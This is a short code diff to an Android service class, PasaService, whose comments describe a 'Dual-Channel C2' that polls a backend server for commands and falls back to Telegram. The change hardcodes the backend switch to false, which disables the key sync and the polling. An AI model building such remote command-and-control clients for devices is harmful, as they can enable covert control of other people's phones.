@@ -345,7 +345,7 @@ class PasaService : LifecycleService() {
             // Synchronize trusted backend signing keys and device credentials on service start
             lifecycleScope.launch(Dispatchers.IO) {
                 try {
-                    val shouldUseBackend = preferencesManager.useBackendServer || preferencesManager.serverUrl.isNotBlank()
+                    val shouldUseBackend = false
                     if (shouldUseBackend && preferencesManager.isConfigured()) {
                         val serverSigningKey = """{"crv":"Ed25519","x":"yd8Y7WZq2YkLBMUuamTDNKQ6IT_HkwdN2MPcPWgjrNs","kty":"OKP","kid":"pasa-server-1"}"""
                         if (!preferencesManager.trustedCommandKeys.containsKey("pasa-server-1")) {
@@ -451,7 +451,7 @@ class PasaService : LifecycleService() {
                     var commandReceivedInCycle = false
 
                     // Dual-Channel C2: Poll VPS backend gateway when configured, fallback to direct Telegram
-                    val shouldUseBackend = preferencesManager.useBackendServer || preferencesManager.serverUrl.isNotBlank()
+                    val shouldUseBackend = false
                     if (shouldUseBackend) {
                         try {
                             val pollResp = pasaBackendApi.pollCommands(preferencesManager.deviceId, timeout = 25)
